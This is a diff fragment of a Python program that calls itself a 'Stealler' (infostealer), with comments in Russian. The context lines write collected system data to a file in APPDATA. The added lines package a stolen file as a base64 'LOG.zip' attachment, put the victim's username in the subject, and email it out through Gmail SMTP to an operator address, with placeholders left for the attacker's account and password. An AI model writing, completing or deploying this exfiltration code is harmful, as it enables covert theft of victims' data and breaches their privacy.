@@ -41,3 +41,32 @@ all_data = "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.
 file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+") 
 file.write(all_data)
 file.close()
+################################################################################
+#                              ОТПРАВКА                                        #
+################################################################################
+'↑Stealler by Andrew_Shipunov↑'.encode('utf-8')
+msgtext = MIMEText('↑Stealler by Andrew_Shipunov↑'.encode('utf-8'), 'plain', 'utf-8')
+msg = MIMEMultipart()
+msg['From'] = 'ваша новая почта@gmail.com'
+msg['To'] = 'почта куда отправится'
+msg['Subject'] = getpass.getuser() + '-PC'
+msg.attach(msgtext)
+################################################################################
+#                              СОЗДАНИЕ ВЛОЖЕНИЯ                               #
+################################################################################
+part = MIMEBase('application', "zip")
+b = open(doc, "rb").read()
+bs = encodebytes(b).decode()
+part.set_payload(bs)
+part.add_header('Content-Transfer-Encoding', 'base64')
+part.add_header('Content-Disposition', 'attachment; filename="LOG.zip"')
+msg.attach(part)
+################################################################################
+#                              ОТПРАВКА вам       #
+################################################################################
+s = smtplib.SMTP('smtp.gmail.com', 587)
+s.starttls()                                   
+s.login('новая ваша почта гмаил', 'пароль от новой почты гмаил')
+s.sendmail('новая ваша почта гмаил', 'почта куда отправится', msg.as_string())
+s.quit()
+i = input()
